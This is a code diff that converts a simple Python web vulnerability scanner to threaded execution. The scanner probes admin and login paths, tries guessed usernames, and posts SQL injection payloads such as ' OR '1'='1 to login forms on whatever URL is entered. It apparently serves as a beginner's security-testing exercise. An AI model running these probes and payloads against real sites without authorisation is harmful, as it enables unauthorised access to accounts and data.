@@ -1,56 +1,98 @@
 import requests
+import threading
 
 base_url = input("Enter target URL: ")
 
-print("\n[INFO] Scanning started...\n")
+print("\n[INFO] Starting scan...\n")
 
 results = []
+lock = threading.Lock()
 
-# 🔍 Directory check
-def scan_directories():
-    paths = ["admin", "login", "dashboard", "secret"]
+# 🔍 Directory scanning
+paths = ["admin", "login", "dashboard", "secret"]
 
-    for path in paths:
-        url = f"{base_url}/{path}"
+def scan_directory(path):
+    url = f"{base_url}/{path}"
+
+    try:
         response = requests.get(url)
 
         if response.status_code == 200:
             result = f"[FOUND] {url}"
             print(result)
-            results.append(result)
+
+            with lock:
+                results.append(result)
+
+    except:
+        pass
+
 
 # 🔐 Auth bypass test
-def test_auth_bypass():
+def test_auth(payload):
     url = f"{base_url}/login"
-    payloads = ["admin", "admin123", "testadmin"]
 
-    for payload in payloads:
+    try:
         data = {"username": payload, "password": "test"}
         response = requests.post(url, data=data)
 
         if "Welcome admin" in response.text:
             result = f"[VULNERABLE] Auth bypass → {payload}"
             print(result)
-            results.append(result)
+
+            with lock:
+                results.append(result)
+
+    except:
+        pass
+
 
 # 💉 SQL Injection test
-def test_sql_injection():
+def test_sql(payload):
     url = f"{base_url}/login2"
-    payloads = ["' OR '1'='1", "' OR 1=1 --"]
 
-    for payload in payloads:
+    try:
         data = {"username": payload, "password": "test"}
         response = requests.post(url, data=data)
 
         if "Logged in" in response.text:
-            result = f"[SQL VULNERABLE] Payload → {payload}"
+            result = f"[SQL VULNERABLE] → {payload}"
             print(result)
-            results.append(result)
 
-# Run all
-scan_directories()
-test_auth_bypass()
-test_sql_injection()
+            with lock:
+                results.append(result)
+
+    except:
+        pass
+
+
+threads = []
+
+# Run directory scan
+for path in paths:
+    t = threading.Thread(target=scan_directory, args=(path,))
+    threads.append(t)
+    t.start()
+
+# Run auth tests
+auth_payloads = ["admin", "admin123", "testadmin"]
+
+for payload in auth_payloads:
+    t = threading.Thread(target=test_auth, args=(payload,))
+    threads.append(t)
+    t.start()
+
+# Run SQL tests
+sql_payloads = ["' OR '1'='1", "' OR 1=1 --"]
+
+for payload in sql_payloads:
+    t = threading.Thread(target=test_sql, args=(payload,))
+    threads.append(t)
+    t.start()
+
+# Wait for all threads
+for t in threads:
+    t.join()
 
 # Save results
 with open("vuln_results.txt", "w", encoding="utf-8") as f:
